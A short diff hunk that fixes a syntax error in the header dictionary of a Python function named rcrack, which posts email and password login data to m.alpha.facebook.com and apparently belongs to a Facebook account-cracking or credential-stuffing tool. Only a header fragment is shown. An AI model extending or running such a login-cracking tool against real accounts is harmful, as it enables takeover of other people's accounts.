@@ -425,7 +425,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'headers = {'authority': 'm.alpha.facebook.com',
+            header_freefb = {'authority': 'm.alpha.facebook.com',
             'method':'GET',
             'path':'/?tbua=1',
             'scheme':'https',
